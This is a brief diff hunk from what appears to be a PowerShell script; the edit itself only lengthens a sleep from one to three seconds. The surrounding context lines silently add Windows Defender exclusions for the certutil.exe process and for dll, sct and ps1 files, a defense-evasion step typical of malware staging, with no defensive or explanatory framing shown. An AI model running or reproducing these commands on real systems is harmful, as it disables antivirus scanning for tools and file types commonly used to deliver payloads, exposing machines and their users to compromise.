@@ -35,4 +35,4 @@ Add-MpPreference -ExclusionProcess "certutil.exe" -ErrorAction SilentlyContinue
 Set-MpPreference -ExclusionExtension "dll","sct","ps1" -ErrorAction SilentlyContinue
 
 # Small delay to ensure all settings are applied
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 3
